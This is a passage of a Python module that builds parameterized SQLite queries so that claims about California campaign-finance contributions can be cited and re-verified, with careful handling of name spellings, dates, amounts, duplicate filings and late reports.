"""Verifiable citations to local datasets.

⌘F on a web page is the right verification for prose. It is the wrong one for a database: a
contribution total is not a string on a page, and forcing it to be one is what pushed
researchers onto third-party mirrors whose numbers we then had to trust.

So a claim can cite a *query* instead. The source records which named query, with which
parameters, and what it returned; verification re-runs it and compares. That is stronger than
a snippet — it is reproducible on demand, and a human can run the same one-liner the pipeline
ran rather than hunting for text.

Queries are **named and parameterized**, never free SQL from an agent: an agent that can
write arbitrary SQL can write a query that returns whatever its claim needs, which is the
same self-certification problem `verification` has elsewhere.
"""

from __future__ import annotations

import datetime
import json
import re
import shlex
from dataclasses import dataclass, field
from pathlib import Path
from typing import Any, Callable, NamedTuple

# Half a CENT, absolute. A 0.5% relative tolerance let a round figure verify against a true
# total more than $2,000 away. Half a cent absorbs float summation noise (~1e-9) and fails any
# figure a whole cent off — where "within one cent" would not: 100.02 - 100.01 is 0.00999… in
# binary floats.
TOLERANCE = 0.005

# Filers do not reliably split a candidate's name: one committee put the full name in the
# LAST-name field with the first name blank, so a (last, first) filter returned $0.00 for the
# largest independent expenditure in a race. Match every spelling a filer might use, and keep
# it exact per spelling so a different person with the same surname stays out.
def name_match_sql(last_col: str, first_col: str, first: str) -> str:
    """SQL matching a candidate name across the spellings filers actually use.

    With a first name given, a bare surname match is deliberately EXCLUDED: a race can have
    two candidates sharing a surname, so it cannot be attributed to either. The case that
    matters, the whole name in the last-name field, is caught by the concatenation clauses
    instead.
    """
    full = f"""
     OR UPPER(TRIM({last_col})) = UPPER(TRIM(?))
     OR UPPER(TRIM(COALESCE({first_col},'') || ' ' || COALESCE({last_col},''))) = UPPER(TRIM(?))
     OR UPPER(TRIM(COALESCE({last_col},'') || ' ' || COALESCE({first_col},''))) = UPPER(TRIM(?))
    """
    if first:
        return f"""(
        (UPPER(TRIM({last_col})) = UPPER(TRIM(?)) AND UPPER(TRIM(COALESCE({first_col},'')))
             = UPPER(TRIM(?))){full})"""
    return f"""(UPPER(TRIM({last_col})) = UPPER(TRIM(?)){full})"""


def name_args(last: str, first: str) -> list[str]:
    """Args for `name_match_sql`, in the same order."""
    full = f"{first} {last}".strip()
    head = [last.strip(), first.strip()] if first else [last.strip()]
    return head + [full, full, full]


def iso_date_sql(col: str) -> str:
    """SQL turning the export's "M/D/YYYY 12:00:00 AM" date text into YYYY-MM-DD.

    Compared as text, 5/24/2026 sorts before 10/14/2014, so every date filter goes through
    this. A value with no slash (already ISO, or blank) passes through minus any time part,
    and NULL reads as blank.
    """
    d = f"TRIM(COALESCE({col}, ''))"
    day = f"SUBSTR({d}, 1, INSTR({d} || ' ', ' ') - 1)"   # "10/14/2025"
    rest = f"SUBSTR({day}, INSTR({day}, '/') + 1)"         # "14/2025"
    return (f"(CASE WHEN INSTR({day}, '/') = 0 THEN {day} ELSE"
            f" SUBSTR({rest}, INSTR({rest}, '/') + 1)"
            f" || '-' || SUBSTR('0' || SUBSTR({day}, 1, INSTR({day}, '/') - 1), -2)"
            f" || '-' || SUBSTR('0' || SUBSTR({rest}, 1, INSTR({rest}, '/') - 1), -2) END)")


def real_date_sql(iso_col: str) -> str:
    """SQL true when an `iso_date_sql()` value is a real calendar date.

    Not its shape: a day-first "14/10/2025" normalizes to "2025-14-10", which looks like a
    date and sorts like one, so a window would place it silently. SQLite's date() rolls an
    impossible day over ("2025-02-31" -> "2025-03-03") and returns NULL for no date at all, so
    only a real date comes back unchanged. `IS`, not `=`, so a blank reads false, not NULL.
    """
    return f"(date({iso_col}) IS {iso_col})"


def date_window_sql(iso_col: str, since: str, until: str) -> tuple[str, list[str]]:
    """SQL keeping an ISO date (`iso_date_sql()` output) inside [since, until], and its args.

    Each bound compares at its own precision: an ISO date sorts after its own prefix, and
    `until` is checked against the date cut to its length, so until="2025" runs through
    12/31/2025. ie_total once cut both bounds to YYYY-MM for a BETWEEN, which made
    until="2025" exclude all of 2025 and widened since="2026-05-24" to the whole of May.
    Refuses a bound that is not a real ISO date (`calaccess.check_date`).

    Returns ("", []) with no bounds. A date that is not a real one (`real_date_sql()`) is
    neither in nor out here: whether to keep it is the caller's call, and it must say which.
    """
    from . import calaccess

    since = calaccess.check_date(since, "since")
    until = calaccess.check_date(until, "until")
    if since and until and since[:len(until)] > until:
        # No date can satisfy it, so it would come back as a well-formed "no expenditures in
        # this window" -- a finding, made out of a typo.
        raise ValueError(f"since {since!r} is after until {until!r}")
    terms, args = [], []
    if since:
        terms.append(f"{iso_col} >= ?")
        args.append(since)
    if until:
        terms.append(f"SUBSTR({iso_col}, 1, LENGTH(?)) <= ?")
        args += [until, until]
    return " AND ".join(terms), args


def amount_sql(col: str) -> str:
    """SQL reading a filed AMOUNT as money: its value for a plain decimal, else NULL.

    A blank AMOUNT is money nobody stated, not $0: CAST made it 0.0 and COUNT(*) still counted
    it, so a total whose only row had one came back found, "$0.00, 1 expenditure(s)" -- the
    zero this module exists to refuse. Not just blanks: CAST reads "N/A" as 0.0 and "1,000" as
    1.0, figures nobody filed. So only a plain decimal is read as money; every query leaves a
    NULL out of its sum AND its count, and names how many it left out. A stated "0" is the
    filer's figure and counts.
    """
    a = f"TRIM(COALESCE({col}, ''))"
    unsigned = f"(CASE WHEN SUBSTR({a}, 1, 1) = '-' THEN SUBSTR({a}, 2) ELSE {a} END)"
    return (f"(CASE WHEN {unsigned} GLOB '*[0-9]*' AND {unsigned} NOT GLOB '*[^0-9.]*'"
            f" AND {unsigned} NOT GLOB '*.*.*' THEN CAST({a} AS REAL) END)")


# A single contribution is reported on BOTH Form 460 Schedule A and Form 496 Part 3 when it
# crosses the 24-hour threshold, as two genuinely different filings — so amendment dedup does
# not catch it, and a large donor's gift came out doubled. The filer links the pair
# explicitly: TRAN_IDs share a base after the form prefix (A-100001 / F496P3-100001).
# Collapse on that base plus contributor, amount and date, within one filer.
def tran_base_sql(col: str) -> str:
    """SQL for a TRAN_ID's base, after its form prefix: the key a gift's reports share."""
    return (f"CASE WHEN INSTR({col}, '-') > 0 THEN SUBSTR({col}, INSTR({col}, '-') + 1)"
            f" ELSE {col} END")


# AMT is the amount as money (`amount_sql()`), NULL where the filer stated none; AMOUNT is the
# text as filed. The group keys on AMT, not CAST(AMOUNT AS REAL): CAST reads "300,000" as
# 300.0, so a row filed that way collapsed into a $300 gift under the same base, MAX() over
# the text kept "300,000", and the stated $300 was lost with it. A dedup has to read a value
# the way the sum does.
DEDUPED_RECEIPTS = f"""
    SELECT MAX(x.AMOUNT) AS AMOUNT, x.AMT, x.CTRIB_NAML, x.CTRIB_NAMF, x.RCPT_DATE,
           -- The group's provenance. A collapsed row still has to name a filing a human can
           -- open, or the listing loses its exit to a citation and every figure taken from it
           -- becomes uncitable. The EARLIEST filing is the one the gift was first reported on.
           MIN(CAST(x.FILING_ID AS INTEGER)) AS FILING_ID,
           COUNT(DISTINCT x.FILING_ID) AS FILINGS,
           -- every filing the gift came from, so one whose latest amendment dropped it is found
           GROUP_CONCAT(DISTINCT x.FILING_ID) AS FILING_IDS,
           MAX(x.CTRIB_EMP) AS CTRIB_EMP, MAX(x.CTRIB_OCC) AS CTRIB_OCC,
           MAX(x.FORM_TYPE) AS FORM_TYPE
    FROM (SELECT r.*, {tran_base_sql("r.TRAN_ID")} AS tbase,
                 {amount_sql("r.AMOUNT")} AS AMT
          FROM RCPT_LATEST r JOIN FILER_FILING f ON f.FILING_ID = r.FILING_ID
          WHERE f.FILER_ID = ?{{extra}}) x
    GROUP BY x.tbase, UPPER(TRIM(x.CTRIB_NAML)), UPPER(TRIM(COALESCE(x.CTRIB_NAMF,''))),
             x.RCPT_DATE, x.AMT
"""


def _unread(n: int, whose: str = "") -> str:
    """The detail a receipt query appends for gifts it left out for want of an amount."""
    return f"; {n} more gift(s){whose} with no readable amount, not counted" if n else ""


def _no_rows(detail: str, suggestions: list[str] | None = None) -> "QueryResult":
    """No matching rows is NEVER a zero.

    `SUM()` over an empty set coalesces to 0.0, and a zero reads as a finding: "no committee
    has spent against this candidate" is a publishable sentence and was, briefly, wrong by
    the largest expenditure in a race. Every query returns this instead.
    """
    return QueryResult(value=None, rows=0, found=False, detail=detail,
                       suggestions=suggestions or [])


def _receipt_shares(con, inner: str, args: list, filing_ids: str | None) -> list:
    """The filings among a receipts figure's gifts whose latest amendment has no receipt rows
    (`calaccess.Unrestated`), with what each accounts for. `inner` is the figure's
    DEDUPED_RECEIPTS, run with the same `args`. Only the gifts the figure counts: one with no
    readable amount is left out of it (`amount_sql()`), so its filing has no share in it.

    `filing_ids` is every filing the figure's counted gifts came from (a GROUP_CONCAT of
    FILING_IDS), read in the pass that computed the figure: the usual figure counts no such
    filing, and then costs no second pass over its gifts.
    """
    from . import calaccess

    gaps = calaccess.unrestated_filings(
        con, "RCPT_CD", {f for f in (filing_ids or "").split(",") if f})
    if not gaps:
        return []
    return calaccess.unrestated_shares(con, "RCPT_CD", [
        ([f for f in (r["ids"] or "").split(",") if f], float(r["amt"]), int(r["n"]))
        for r in con.execute(f"""
            SELECT d.FILING_IDS ids, SUM(d.AMT) amt, COUNT(*) n
            FROM ({inner}) d WHERE d.AMT IS NOT NULL GROUP BY d.FILING_IDS""", args)], gaps)


@dataclass
class QueryResult:
    value: Any
    detail: str = ""
    rows: int = 0
    found: bool = True
    suggestions: list[str] | None = None
    # Set by `run()`, never by a query: which definition produced the value, and from which
    # export (see `Query.version` and `export_date()`).
    version: int = 0
    export_date: str = ""
    # Filings the value counts rows from although their latest amendment has none
    # (`calaccess.Unrestated`), with what each accounts for. A value with any is not verified.
    unrestated: list = field(default_factory=list)
    # Late reports the value leaves out although they could change it (`LateReport`): any with
    # an amount nobody stated first, then the most money either way. A value with any is not
    # verified.
    late: list = field(default_factory=list)

    @property
    def note(self) -> str:
        n = self.detail
        if not self.found and self.suggestions:
            n += " — NO MATCH. Did you mean: " + "; ".join(self.suggestions[:4])
        elif not self.found:
            n += " — NO MATCH for that name"
        return n

    @property
    def unsettled(self) -> str:
        """Why this value cannot verify as it stands, or "". Two reasons, each with the filings
        a person opens, since a note alone would still render green:

        - `unrestated`: a filing's latest amendment can carry a cover and no rows in a table,
          and the rows the value counts are then an earlier amendment's. That amendment either
          withdrew them or did not restate that schedule, and the export cannot say which.
        - `late`: a figure for a schedule asked for by name (form_type=A, or "" for every
          schedule) is that schedule's as filed, and a late-reported gift no 460 restates yet
          is not in it: "gave $3,000" reads as the whole story a week after a $4,000 late gift.
          Only the claim's wording settles whether it holds: as a schedule-A figure as filed,
          it stands; as the whole total or the largest giver, it may not.

        Each names its UNSETTLED_SHOWN or LATE_SHOWN largest: this becomes a claim file's
        reason, and a committee's whole history can name dozens. `vg query` prints the rest.
        """
        why = []
        if self.unrestated:
            each = "; ".join(share_text(u) for u in self.unrestated[:UNSETTLED_SHOWN])
            if (rest := len(self.unrestated) - UNSETTLED_SHOWN) > 0:
                each += f"; and {rest} more filing(s) with smaller shares, which `vg query` lists"
            why.append(f"counts rows a later amendment may have withdrawn, and the export cannot "
                       f"say whether it did. {each}. If a latest amendment removed its rows, this "
                       f"value is wrong; if it only left that schedule unchanged, the value "
                       f"stands.")
        if self.late:
            each = "; ".join(late_text(r) for r in self.late[:LATE_SHOWN])
            # > 0, not truthiness: with fewer reports than shown the difference is negative, and
            # truthy, and the reason ended "and -4 more late report(s)"
            if (rest := len(self.late) - LATE_SHOWN) > 0:
                each += f"; and {rest} more late report(s), which `vg query` lists"
            why.append("leaves out late-reported contributions that no Form 460 schedule A "
                       f"restates yet, and they could change it. {each}. Worded as this "
                       "schedule's figure or ranking as filed, the value stands; worded as the "
                       "whole total, or as who gave the most, it may not: check whether these "
                       "gifts change it.")
        return "it " + " It also ".join(why) if why else ""

UNSETTLED_SHOWN = 5


def share_text(u) -> str:
    """One unrestated filing's line in `QueryResult.unsettled`: what it is, what the result
    rests on from it, and where to open it. "Rests on", not "adds up to": for top_contributor
    the rows are anyone's gifts in the ranking, not the named contributor's total."""
    return (f"{u.describe()}: ${u.amount:,.2f} in {u.rows} row(s) this result rests on "
            f"(open {u.cite_url})")


# How many late reports `QueryResult.unsettled` names. Display only.
LATE_SHOWN = 5


@dataclass
class LateReport:
    """One late report's entries that a figure leaves out (`QueryResult.late`)."""
    filing_id: int
    amend_id: str           # the amendment the entries come from (the *_LATEST views)
    forms: frozenset[str]   # this filing's forms: F497P1, or F496P3
    also: frozenset[int]    # other filings reporting one of these gifts under its TRAN_ID base
    amount: float           # the entries' stated amounts, summed
    gross: float            # the same, each taken as positive: a gift and its correction net to 0
    entries: int
    unread: int             # entries with no amount a reader could add up

    @property
    def cite_url(self) -> str:
        from . import calaccess

        return calaccess.filing_url(self.filing_id)


def late_text(r: LateReport) -> str:
    """One late report's line in `QueryResult.unsettled`: which filing, what it holds that the
    value leaves out, and where to open it. Display only."""
    form = " and ".join({"F497P1": "Form 497", "F496P3": "Form 496 Part 3"}.get(f, f)
                        for f in sorted(r.forms))
    held = f"${r.amount:,.2f} in {r.entries} entr{'y' if r.entries == 1 else 'ies'}"
    if r.gross > abs(r.amount) + TOLERANCE:
        held += f", ${r.gross:,.2f} before netting"
    if r.unread:
        held += f", {r.unread} with no readable amount"
    where = f"filing {r.filing_id}" + (f" amendment {r.amend_id}"
                                       if r.amend_id not in ("", "0") else "")
    if r.also:
        form += f"; also on filing {', '.join(map(str, sorted(r.also)))}"
    return f"{where} ({form}): {held} (open {r.cite_url})"


def _schedule(form_type: str) -> tuple[str, list[str], str]:
    """The receipt-schedule filter every contribution query applies (a condition on `r`), its
    args, and the label for the detail (`_schedule_label`).

    One helper for all three, not a copy in each: filer_total kept an unguarded copy after the
    other two were fixed. It ran form_type=" " (truthy) as a filter for the receipts with no
    schedule and returned their sum as found, labelled "schedule- ", which reproduced green.
    """
    if form_type != form_type.strip():
        raise ValueError(f"form_type must be a schedule code, or '' for every schedule, "
                         f"not {form_type!r}")
    label = _schedule_label(form_type)
    if not form_type:
        return "", [], label
    return " AND UPPER(TRIM(r.FORM_TYPE)) = UPPER(TRIM(?))", [form_type], label


def _schedule_label(form_type: str) -> str:
    """How a detail names the schedules counted: `schedule-<CODE>`, or `every-schedule` for "".

    The code is upper-cased as the filter matches it and as a miss names the other schedules,
    so "f401a" reads schedule-F401A, not a schedule of its own. ASCII letters only, as SQLite's
    UPPER() does: Python upper-cases "ß" to "SS", which would name a schedule nothing matched.
    Display only, so it is not part of a query's definition fingerprint.
    """
    if not form_type:
        return "every-schedule"
    return "schedule-" + "".join(c.upper() if c.isascii() else c for c in form_type)


def _other_schedules(con: Any, filer_id: str, form_type: str, who: str = "",
                     who_args: list[Any] | None = None) -> list[str]:
    """The receipt schedules besides `form_type` that hold this filer's receipts (narrowed by
    `who`, a condition on `r`), for a miss to suggest. Empty when `form_type` is "", which
    already counted every schedule.

    Suggestions only: nothing here reaches a value, which is why the definition fingerprint
    leaves it out. Read from the raw schedules, not DEDUPED_RECEIPTS, whose collapsed
    cross-form group carries only one of its schedules (A-100001 and F496P3-100001 read as
    F496P3). A blank schedule is left out: no form_type selects it alone, and "form_type="
    would count every schedule.
    """
    if not form_type:
        return []
    return [r[0] for r in con.execute(f"""
        SELECT DISTINCT UPPER(TRIM(r.FORM_TYPE)) FROM RCPT_LATEST r
        JOIN FILER_FILING f ON f.FILING_ID = r.FILING_ID
        WHERE f.FILER_ID = ?{who}
          AND UPPER(TRIM(COALESCE(r.FORM_TYPE, ''))) NOT IN ('', UPPER(TRIM(?)))
        ORDER BY 1
    """, [str(filer_id), *(who_args or []), form_type])]


def _elsewhere(con: Any, filer_id: str, form_type: str, who: str = "",
               who_args: list[Any] | None = None) -> tuple[str, list[str]]:
    """For a miss on `form_type`: the note naming the other schedules this filer's receipts are
    on (`_other_schedules`), and the one suggestion to count them. ("", []) when there are none.

    A slate mailer's receipts are all on Form 401, and "no schedule-A contributions" alone read
    as a committee that received nothing. One suggestion for every schedule, not one each: the
    note shows four, and a hint per schedule pushed out the near-name the researcher needed.
    Display only, like `_other_schedules`.
    """
    others = _other_schedules(con, filer_id, form_type, who, who_args)
    if not others:
        return "", []
    return (f"; receipts on schedule {', '.join(others)} not counted",
            ["form_type=" + ", form_type=".join(others)])


# Late reports. A contribution received in the weeks before an election is reported within 24
# hours on a late report: Form 497 Part 1 (S497_CD), or Form 496 Part 3 (F496P3 rows in RCPT_CD)
# for a committee making independent expenditures. Each is restated later on the schedule A of
# the Form 460 whose period covers the gift. Until that 460 is filed the gift is on the late
# report alone, and a schedule-A total leaves it out: in the weeks a voter guide is written, the
# largest gift could be missing from `top_contributor` and every total, and the citation would
# still reproduce green.
#
# Late entries are never added to a total, only held against one: the contribution queries
# refuse by default when one could change their answer (`_late_reports`), and a schedule asked
# for by name answers but goes to a person, naming each late report (`QueryResult.unsettled`).
# Counting them would rest on keys nobody has checked against a real export: whether a Form 497
# entry shares its TRAN_ID base with its schedule-A copy, and whether a gift reported on both
# late forms can be told apart from two gifts. A key that fails there double-counts silently;
# here it only refuses.
#
# An entry counts as restated, and is not pending, when:
# - a schedule-A row carries the same transaction: TRAN_ID base, name, date and amount, all four
#   equal (the cross-form key DEDUPED_RECEIPTS collapses on); or
# - a Form 460 the filer has filed covers its dates, since that 460 had to restate it.
# Everything uncertain leaves it pending, or widens what it could change: a date or amount that
# cannot be read, and a name that could be a contributor's (`_could_be`).
def _pending_late(con: Any, filer_id: str) -> list[dict[str, Any]]:
    """The late-report entries for a filer that no schedule A restates yet (see above). The
    caller checks first that Form 497 can be read (calaccess.late_reports_loaded).

    One per transaction as the cross-form key tells them apart, so an entry restated in an
    amendment counts once (the *_LATEST views) and one on both late forms under one TRAN_ID base
    counts once. One on both under different bases counts twice, which only makes a refusal
    likelier.
    """
    tables = {r[0] for r in con.execute("SELECT name FROM main.sqlite_master WHERE type = 'table'")}
    parts = [f"""
        SELECT r.FILING_ID AS filing_id, {tran_base_sql("r.TRAN_ID")} AS tbase,
               r.CTRIB_NAML AS naml, r.CTRIB_NAMF AS namf, r.AMOUNT AS amount,
               {amount_sql("r.AMOUNT")} AS amt, UPPER(TRIM(r.FORM_TYPE)) AS form,
               {iso_date_sql("r.RCPT_DATE")} AS d, '' AS until, r.AMEND_ID AS amend
        FROM RCPT_LATEST r JOIN FILER_FILING f ON f.FILING_ID = r.FILING_ID
        WHERE f.FILER_ID = ? AND UPPER(TRIM(r.FORM_TYPE)) = 'F496P3'"""]
    args: list[Any] = [str(filer_id)]
    if "S497_CD" in tables:
        # DATE_THRU ends an entry covering a range of dates. Not every export need carry it,
        # and without it an entry is its CTRIB_DATE.
        s497_cols = {r[1] for r in con.execute('PRAGMA main.table_info("S497_CD")')}
        until = iso_date_sql("s.DATE_THRU") if "DATE_THRU" in s497_cols else "''"
        parts.append(f"""
        SELECT s.FILING_ID, {tran_base_sql("s.TRAN_ID")}, s.ENTY_NAML, s.ENTY_NAMF, s.AMOUNT,
               {amount_sql("s.AMOUNT")}, UPPER(TRIM(s.FORM_TYPE)), {iso_date_sql("s.CTRIB_DATE")},
               {until}, s.AMEND_ID
        FROM S497_LATEST s JOIN FILER_FILING f ON f.FILING_ID = s.FILING_ID
        WHERE f.FILER_ID = ? AND UPPER(TRIM(s.FORM_TYPE)) = 'F497P1'""")
        args.append(str(filer_id))
    rows = [dict(r) for r in con.execute(" UNION ALL ".join(parts), args)]
    if not rows:
        return []

    # Schedule-A rows that could be one of these transactions: only under their TRAN_ID bases.
    restated = set()
    bases = sorted({str(r["tbase"]) for r in rows})
    for i in range(0, len(bases), 500):
        chunk = bases[i:i + 500]
        restated |= {_transaction(a) for a in con.execute(f"""
            SELECT * FROM (
                SELECT {tran_base_sql("r.TRAN_ID")} AS tbase, r.CTRIB_NAML AS naml,
                       r.CTRIB_NAMF AS namf, r.AMOUNT AS amount,
                       {amount_sql("r.AMOUNT")} AS amt, {iso_date_sql("r.RCPT_DATE")} AS d
                FROM RCPT_LATEST r JOIN FILER_FILING f ON f.FILING_ID = r.FILING_ID
                WHERE f.FILER_ID = ? AND UPPER(TRIM(r.FORM_TYPE)) = 'A')
            WHERE tbase IN ({", ".join("?" * len(chunk))})
        """, [str(filer_id), *chunk])}

    entries: dict[tuple[Any, ...], dict[str, Any]] = {}
    for r in rows:
        key = _transaction(r)
        if key in restated:
            continue
        e = entries.setdefault(key, {**r, "forms": set(), "copies": {},
                                     "filing_id": int(r["filing_id"])})
        e["forms"].add(r["form"])
        # which filing and amendment says it, for the reviewer to open
        e["copies"][int(r["filing_id"])] = (r["form"], str(r["amend"] or "0").strip())
        e["filing_id"] = min(e["filing_id"], int(r["filing_id"]))
        e["until"] = max(e["until"] or "", r["until"] or "")
    # The filer's Form 460 periods. A period that cannot be read covers nothing.
    periods = []
    cover_cols = ({r[1] for r in con.execute(
        'PRAGMA main.table_info("CVR_CAMPAIGN_DISCLOSURE_CD")')}
        if "CVR_CAMPAIGN_DISCLOSURE_CD" in tables else set())
    if {"FILING_ID", "FORM_TYPE", "FROM_DATE", "THRU_DATE"} <= cover_cols:
        periods = con.execute(f"""
            SELECT pf, pt FROM (
                SELECT {iso_date_sql("c.FROM_DATE")} AS pf, {iso_date_sql("c.THRU_DATE")} AS pt
                FROM CVR_LATEST c JOIN FILER_FILING f ON f.FILING_ID = c.FILING_ID
                WHERE f.FILER_ID = ? AND UPPER(TRIM(c.FORM_TYPE)) = 'F460')
            WHERE {real_date_sql("pf")} AND {real_date_sql("pt")}
        """, [str(filer_id)]).fetchall()

    def covered(e: dict[str, Any]) -> bool:
        # One 460 has to cover the whole entry, CTRIB_DATE through DATE_THRU.
        start, end = e["d"], e["until"] or e["d"]
        return (_real_day(start) and _real_day(end)
                and any(pf <= start <= pt and pf <= end <= pt for pf, pt in periods))

    return sorted((e for e in entries.values() if not covered(e)),
                  key=lambda e: (e["d"], e["filing_id"]))


def _transaction(r: Any) -> tuple[Any, ...]:
    """The cross-form key of a receipt row: TRAN_ID base, name, date and amount, the amount as
    `amount_sql()` reads it (`amt`), as the dedup and every sum do. A blank or unreadable amount
    keys as its text, so it never pairs with a stated 0 ("1,000" is not 1)."""
    amount = r["amt"]
    return (str(r["tbase"]), str(r["naml"] or "").strip().upper(),
            str(r["namf"] or "").strip().upper(), r["d"],
            amount if amount is not None else f"text:{str(r['amount'] or '').strip()}")


def _real_day(iso: Any) -> bool:
    """Whether an `iso_date_sql()` value is a real calendar day, as `real_date_sql()` asks."""
    from . import calaccess

    try:
        return bool(calaccess.ISO_DAY.fullmatch(iso or "")) and bool(
            datetime.date.fromisoformat(iso))
    except ValueError:
        return False


def _name_words(last: Any, first: Any = "") -> frozenset[str]:
    """A name as the set of its words, case and punctuation aside, so the spellings filers use
    for one name read alike: split, whole in the last-name field, or "LAST, FIRST"."""
    return frozenset(re.findall(r"[^\W_]+", f"{first or ''} {last or ''}".upper()))


def _could_be(a: frozenset[str], b: frozenset[str]) -> bool:
    """Whether two names could be one giver: one's words all in the other's. A middle
    initial, a bare surname, a short form of an organization's name, or no name at all could
    each be the same giver. Used only to widen what a late entry could change, never to add it
    to a total, so a false match makes a query refuse and a missed one lets a short figure
    through. A name spelled differently, not merely filed differently, is still missed."""
    return a <= b or b <= a


def _late_reports(con: Any, filer_id: str, form_type: str, last: str = "", first: str = "",
                  who: str = "", who_args: list[Any] | None = None) -> list[dict[str, Any]]:
    """The pending late entries a result leaves out, for one contributor when `last` is given.
    `who` and `who_args` are the name filter the result's sum runs (a condition on `r`).

    For schedule A, every pending entry. For every schedule (""), the Form 497 entries, and the
    Form 496 Part 3 ones the sum's name filter does not take: that sum holds the rest. For any
    other schedule, none, and nothing is read. For A or "", a database that cannot read Form 497
    cannot say none is pending, so it refuses like a degraded one does, whether or not the
    schedule was named: a figure it could not check would otherwise verify green
    (`QueryResult.unsettled`).
    """
    from . import calaccess

    schedule = form_type.strip().upper()
    if schedule not in ("A", ""):
        return []
    if not calaccess.late_reports_loaded(con):
        con.close()
        raise calaccess.DegradedDatabase(calaccess.LATE_FALLBACK)
    # A stated $0 changes no total and moves no one in a ranking, so it holds nothing.
    late = [e for e in _pending_late(con, filer_id) if e["amt"] != 0]
    if last:
        theirs = _name_words(last, first)
        late = [e for e in late if _could_be(_name_words(e["naml"], e["namf"]), theirs)]
    if not schedule:
        # A contributor's total sums only the Form 496 Part 3 rows filed under the name it
        # matches, and a late entry is held against every name it could be: one filed another
        # way ("DOE JANE" whole in the last-name field) is a gift that sum leaves out. Asked of
        # the sum's own filter, so the two can't disagree about a name.
        late = [e for e in late if "F496P3" not in e["forms"] or not con.execute(
            f"SELECT 1 FROM (SELECT ? AS CTRIB_NAML, ? AS CTRIB_NAMF) r WHERE 1{who}",
            [e["naml"], e["namf"], *(who_args or [])]).fetchone()]
    return late


def _by_report(entries: list[dict[str, Any]]) -> list[LateReport]:
    """Pending late entries grouped by the filing to open, for `QueryResult.late`: those with
    an amount nobody stated first, since it could be anything, then the most money either way.
    Not the net: a gift and its correction on one report net to $0 and could still move a
    figure, since either could be the one a 460 restates.

    A gift on both late forms is filed under its earliest filing, with that filing's own form
    and amendment, and names the other filing as `also`."""
    reports: dict[int, LateReport] = {}
    for e in entries:
        form, amend = e["copies"][e["filing_id"]]
        r = reports.setdefault(e["filing_id"], LateReport(
            filing_id=e["filing_id"], amend_id=amend, forms=frozenset(), also=frozenset(),
            amount=0.0, gross=0.0, entries=0, unread=0))
        a = e["amt"]
        r.forms |= {form}
        r.also |= set(e["copies"]) - {e["filing_id"]}
        r.amount += a or 0.0
        r.gross += abs(a or 0.0)
        r.entries += 1
        r.unread += a is None
    return sorted(reports.values(), key=lambda r: (-bool(r.unread), -r.gross, r.filing_id))


def _late_note(entries: list[dict[str, Any]], then: str = "") -> str:
    """How a detail names the late entries left out, `then` following them. Display only."""
    if not entries:
        return ""
    reports = _by_report(entries)
    stated = sum(r.amount for r in reports)
    unread = sum(r.unread for r in reports)
    ids = sorted(r.filing_id for r in reports)
    return (f"{len(entries)} late-report entr{'y' if len(entries) == 1 else 'ies'} "
            f"(${stated:,.2f}"
            + (f"; {unread} with no readable amount" if unread else "")
            + f"; filing {', '.join(map(str, ids[:4]))}{', ...' if len(ids) > 4 else ''})"
            " not yet restated on a Form 460 schedule A" + then)


# What a figure asked for by schedule says when it leaves late entries out. The number
# reproduces, and whether the sentence around it holds is for the person the row goes to
# (`QueryResult.unsettled`).
NOT_COMPLETE = (", not counted — a figure for this schedule as filed, NOT a complete total; "
                "do not word it as one")


def _gate(form_type: str | None) -> tuple[bool, str]:
    """(whether late reports gate the result, the schedule to count). Unset means schedule A,
    a miss while a late report could change it; "A" by name means schedule A as filed, held
    for a person while one could (`QueryResult.late`)."""
    return form_type is None, "A" if form_type is None else form_type


def _contributor_total(root: Path, *, filer_id: str, contributor: str,
                       contributor_first: str = "", form_type: str | None = None) -> QueryResult:
    """Total itemized contributions from one contributor to one filer.

    For an INDIVIDUAL pass `contributor_first` too: CTRIB_NAML holds only the surname, so a
    common surname alone summed unrelated donors into one six-figure contributor who does not
    exist. Organizations keep their whole name in CTRIB_NAML, so they need only `contributor`.

    `form_type` defaults to A (monetary contributions received), as `filer_total` does. The
    receipts table holds every receipt schedule, so without it an in-kind item (C) was summed
    as a gift, and a vendor's refund or a bank's interest (I) made a business that gave nothing
    a contributor. Pass another schedule to count that one, or "" for every schedule.

    Left unset, it is a miss while this contributor has a late-reported gift no schedule A
    restates yet (`_pending_late`): the schedule-A sum is then short of what they gave. Pass
    form_type=A for the schedule-A figure alone. It still does not verify while such a gift is
    pending (`QueryResult.unsettled`): a person opens the late reports it names.
    """
    from . import calaccess

    gated, form_type = _gate(form_type)
    schedule, schedule_args, label = _schedule(form_type)
    con = calaccess.connect_citable(root)
    who = " AND UPPER(TRIM(r.CTRIB_NAML)) = UPPER(TRIM(?))"
    who_args: list[Any] = [contributor]
    if contributor_first:
        who += " AND UPPER(TRIM(COALESCE(r.CTRIB_NAMF,''))) = UPPER(TRIM(?))"
        who_args.append(contributor_first)
    late = _late_reports(con, filer_id, form_type, contributor, contributor_first, who, who_args)
    args: list[Any] = [str(filer_id)] + who_args + schedule_args
    inner = DEDUPED_RECEIPTS.format(extra=who + schedule)
    # One pass: the dedup is the expensive part, and the first-name count needs it too. The
    # names come back whole, not counted, since a late giver may add to them (below).
    row = con.execute(f"""
        SELECT SUM(d.AMT) amt, COUNT(d.AMT) n, COUNT(*) gifts,
               json_group_array(DISTINCT UPPER(TRIM(COALESCE(d.CTRIB_NAMF,'')))) firsts,
               GROUP_CONCAT(DISTINCT CASE WHEN d.AMT IS NOT NULL THEN d.FILING_IDS END) ids
        FROM ({inner}) d
    """, args).fetchone()
    n, gifts = int(row["n"] or 0), int(row["gifts"] or 0)
    if gifts == 0:
        # A zero here is ambiguous and dangerous: it reads as "this donor gave nothing" when
        # it usually means the name was typed slightly differently ("… PAC" vs "… PAC SCC").
        # Never let a miss masquerade as a finding. Names come from the schedule searched: a
        # near-match on another one is a receipt, not the contributor that was meant.
        near = [" ".join(x for x in (r["nf"], r["nm"]) if x) for r in con.execute(f"""
            SELECT DISTINCT r.CTRIB_NAML nm, r.CTRIB_NAMF nf FROM RCPT_LATEST r
            JOIN FILER_FILING f ON f.FILING_ID = r.FILING_ID
            WHERE f.FILER_ID = ? AND UPPER(r.CTRIB_NAML) LIKE UPPER(?){schedule}
            LIMIT 6
        """, [str(filer_id), f"%{contributor.split()[0]}%" if contributor.split() else "%"]
             + schedule_args)]
        # The name matched, on a schedule this did not count: say where, rather than leave
        # "no match" to send the researcher off retyping a name that was right.
        note, hint = _elsewhere(con, filer_id, form_type, who, who_args)
        if late_note := _late_note(late):
            note += f"; {late_note}"
        con.close()
        return QueryResult(value=None, rows=0, found=False, suggestions=hint + near,
                           detail=f"0 itemized {label} gift(s){note}")

    if not contributor_first:
